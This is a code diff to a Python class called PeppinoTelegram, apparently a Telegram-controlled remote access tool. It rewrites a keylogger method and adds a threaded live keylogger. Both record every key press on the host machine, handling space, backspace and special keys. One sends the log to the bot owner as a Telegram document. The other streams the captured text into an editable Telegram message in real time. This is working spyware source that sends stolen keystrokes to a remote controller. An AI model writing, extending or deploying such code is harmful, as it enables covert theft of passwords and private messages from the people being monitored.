@@ -1516,42 +1516,71 @@ class PeppinoTelegram:
     def jumpscarenoaudio(self) -> None:
         self.jumpscare(playaudio=False)
 
+    def keylogger_to_buffer(self, state: dict["value":str,"running":bool]) -> None:
+        while state["running"]:
+            event = read_event()
+            if event.event_type == KEY_DOWN:
+                name = event.name
+                if len(name) != 1:
+                    if name == "space":
+                        k=" "
+                    elif name == "maiusc":
+                        continue
+                    elif name == "backspace":
+                        state["value"]=state["value"][:-1]
+                        continue
+                    else:
+                        k=f" <{name.upper()}> "
+                else:
+                    k = name
+                state["value"]+=k
+
     def keylogger(self, timeout: int=10) -> None:
-        buffer = StringIO()
+        buffer = ""
         start=time()
-        loading_bar = self.new_loading_bar(timeout, "Keylogger with file", showperc=True)
+        loading_bar = self.new_loading_bar(timeout, f"{emoji_dict["keyboard"]} Keylogger with file", showperc=True)
         while (time()-start)<timeout:
             loading_bar.update(time()-start)
             event = read_event()
             if event.event_type == KEY_DOWN:
-                e = event.name.split()[0]
-                if e in printable:
-                    buffer.write(e)
+                name = event.name
+                if len(name) != 1:
+                    if name == "space":
+                        k=" "
+                    elif name == "maiusc":
+                        continue
+                    elif name == "backspace":
+                        buffer = buffer[:-1]
+                        continue
+                    else:
+                        k=f" <{name.upper()}> "
                 else:
-                    buffer.write(f"\n{e.upper()}\n")
-        buffer.seek(0)
-        with buffer:
-            self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",buffer))
-        loading_bar.set100()
-        loading_bar.delete()
+                    k = name
+            buffer+=k
+        filename = randomname()
+        with open(filename, "w") as fo:
+            fo.write(buffer)
+        with open(filename, "r") as fi:
+            self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",fi))
+        loading_bar.fill_and_delete()
 
     def leftclick(self) -> None:
         pg.leftClick()
 
     def live_keylogger(self, timeout=10) -> None:
         start = time()
-        buffer = ""
-        self.bsend("Live keylogger started")
-        while time()-start < timeout:
-            event = read_event()
-            if event.event_type == KEY_DOWN:
-                e = event.name.split()[0]
-                if e in printable and not(e in " \n\t"):
-                    buffer+=e
-                else:
-                    self.bsend(f"BUFFER: {buffer}")
-                    buffer=""
-        self.bsend("Live keylogger done")
+        bar = self.new_loading_bar(timeout, label=f"📡 Live Keylogger")
+        state = {"value":"📡 Live Keylogger Output: ",
+                  "running":True}
+        buffer_message = self.new_editable_message(state["value"])
+        elapsed = 0
+        Thread(target=self.keylogger_to_buffer, args=(state, )).start()
+        while elapsed < timeout:
+            elapsed = time()-start
+            bar.update(elapsed)
+            buffer_message.edit(state["value"])
+        state["running"]=False
+        bar.fill_and_delete()
 
     def load_plugins(self) -> None:
         try:
